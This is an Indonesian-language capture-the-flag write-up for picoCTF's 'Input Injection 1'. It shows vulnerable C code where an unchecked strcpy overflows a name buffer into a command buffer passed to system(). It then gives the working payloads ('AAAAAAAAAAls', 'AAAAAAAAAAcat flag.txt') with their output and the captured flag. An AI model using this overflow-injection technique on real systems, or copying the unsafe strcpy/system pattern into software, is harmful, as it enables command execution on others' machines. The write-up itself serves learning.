<img width="1358" height="683" alt="image" src="https://github.com/user-attachments/assets/343ddf76-3fb7-4bdd-9f7f-25066f7ada44" />

## Info Challenge
**Challenge:** Input Injection 1  
**nc yang dikasih:** `nc amiable-citadel.picoctf.net 57507`  
**file yang dikasih:** `vuln` , `vuln.c` 

## Solusi

### 1. buka sc nya dulu yg dikasih


```c
void fun(char *name, char *cmd) {
    char c[10];        
    char buffer[10];  
    
    strcpy(c, cmd);
    strcpy(buffer, name); 
    
    printf("Goodbye, %s!\n", buffer);
    system(c); 
}
```

**vuln ketemu tuh:** buffer overflow di `strcpy(buffer, name)`. karena c dan buffer mereka bersebelahan, overflow pada `buffer` bisa menimpa `c` jadi intinya kalo kita input nama dan kelebihan kita bisa akses c .

### 2. tes program 
Coba konek normal:
```
$ nc amiable-citadel.picoctf.net 57507
What is your name?
test
Goodbye, test!
Linux
```
aman saja disini berfungsi denhan baik

### 3. cari panjang overflownya brp 
 perlu overflow `buffer[10]` ke `c[10]` perlu mengisi:
- `buffer[10]` penuh (10 bytes)
- plus cukup untuk timpa "uname" di `c`

aku coba dengan 10 'A':
```
AAAAAAAAAA
Goodbye, AAAAAAAAAA!
Linux  # masih "uname"
```

### 4. kita eksekusi
coba overflow dengan cmd baru abis 10 'A':
```
AAAAAAAAAAls
```
hmmm hasilnya:
```
Goodbye, AAAAAAAAAAls!
flag.txt
vuln
vuln.c
```

### 5. dapetin flag 
ganti "ls" dengan "cat flag.txt":
```
AAAAAAAAAAcat flag.txt
```
hasil:
```
Goodbye, AAAAAAAAAAcat flag.txt!
picoCTF{0v3rfl0w_c0mm4nd_d3eb7161} 
```

## flag
`flag`
picoCTF{0v3rfl0w_c0mm4nd_d3eb7161} 
![Uploading Screenshot 2025-12-13 145522.png…]()



<img width="1358" height="683" alt="Screenshot 2025-12-13 145554" src="https://github.com/user-attachments/assets/5dcef757-0ada-40d2-ad15-5788c4657175" />



